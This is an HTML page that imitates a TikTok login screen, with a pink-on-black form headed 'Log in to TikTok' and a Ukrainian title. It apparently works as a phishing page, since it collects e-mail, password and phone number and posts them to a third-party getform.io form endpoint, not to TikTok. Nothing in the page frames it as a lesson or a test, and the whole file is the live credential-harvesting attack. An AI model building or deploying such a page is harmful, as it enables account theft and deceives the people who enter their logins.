<!DOCTYPE html>
<html lang="uk">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Реєстрація TikTok</title>
  <style>
    body {
      background: #000;
      color: #fff;
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .register-form {
      background: #1c1c1c;
      padding: 30px;
      border-radius: 10px;
      box-shadow: 0 0 20px rgba(255, 0, 100, 0.4);
      width: 300px;
    }

    .register-form h2 {
      text-align: center;
      color: #ff0050;
      margin-bottom: 20px;
    }

    .register-form input {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: none;
      border-radius: 5px;
      background: #333;
      color: #fff;
    }

    .register-form input::placeholder {
      color: #aaa;
    }

    .register-form button {
      width: 100%;
      padding: 10px;
      background: #ff0050;
      border: none;
      border-radius: 5px;
      color: white;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.3s;
    }

    .register-form button:hover {
      background: #e60045;
    }
  </style>
</head>
<body>
  <form class="register-form" action="https://getform.io/f/aroneyob" method="POST">
    <h2>Log in to TikTok</h2>
    <input type="email" name="email" placeholder="E-mail" required>
    <input type="password" name="password" placeholder="Password" required>
    <input type="tel" name="phone" placeholder="Phone number" required>
    <button type="submit">Sign in</button>
  </form>

</body>
</html>
